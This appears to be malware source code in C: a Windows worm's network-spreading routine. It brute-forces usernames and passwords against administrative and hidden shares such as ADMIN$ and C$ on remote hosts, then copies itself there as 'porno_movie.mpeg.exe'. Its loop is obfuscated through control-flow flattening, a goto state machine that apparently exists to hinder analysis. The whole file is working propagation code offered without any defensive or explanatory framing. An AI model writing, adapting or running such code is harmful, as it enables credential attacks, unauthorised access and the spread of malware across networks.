#include "data_globals.h"
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
void _NetSpread(uint32_t param_1, LPCSTR param_2)
{
    volatile int dummy_state = 1;
    NETRESOURCEA net_inf;
    char nb_remote[MAX_PATH];
    char *share_name[] = {"SharedDocs", "ADMIN$", "C$", "D$", "E$", "C", "D"};
    DWORD ret, share_cnt, users_cnt, pwd_cnt;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 7) goto dummy_state_7;
    if (dummy_state == 8) goto dummy_state_8;
    if (dummy_state == 9) goto dummy_state_9;
    if (dummy_state == 10) goto dummy_state_10;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    share_cnt = 0;
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    if (share_cnt < 7) {
        dummy_state = 3;
        goto dummy_dispatcher;
    }
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_state_3:
    users_cnt = 0;
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    if (users_cnt < USERS_NUM) {
        dummy_state = 5;
        goto dummy_dispatcher;
    }
    dummy_state = 10;
    goto dummy_dispatcher;

dummy_state_5:
    pwd_cnt = 0;
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_6:
    if (pwd_cnt < PWD_NUM) {
        dummy_state = 7;
        goto dummy_dispatcher;
    }
    dummy_state = 9;
    goto dummy_dispatcher;

dummy_state_7:
    memset(nb_remote, 0, MAX_PATH);
    sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);

    memset(&net_inf, 0, sizeof(net_inf));
    net_inf.dwDisplayType = RESOURCETYPE_ANY;
    net_inf.lpRemoteName = nb_remote;
    net_inf.lpLocalName = NULL;
    net_inf.lpProvider = NULL;

    ret = WNetAddConnection2A(&net_inf,
                              passwords_list[pwd_cnt],
                              users_list[users_cnt],
                              0);

    if (ret == NO_ERROR)
    {
        strcat(nb_remote, "\\porno_movie.mpeg.exe");
        CopyFileA(param_2, nb_remote, FALSE);

        memset(nb_remote, 0, MAX_PATH);
        sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);
        WNetCancelConnectionA(nb_remote, TRUE);
    }
    dummy_state = 8;
    goto dummy_dispatcher;

dummy_state_8:
    pwd_cnt++;
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_9:
    users_cnt++;
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_10:
    share_cnt++;
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_end:
    return;
}
#pragma optimize("", on)
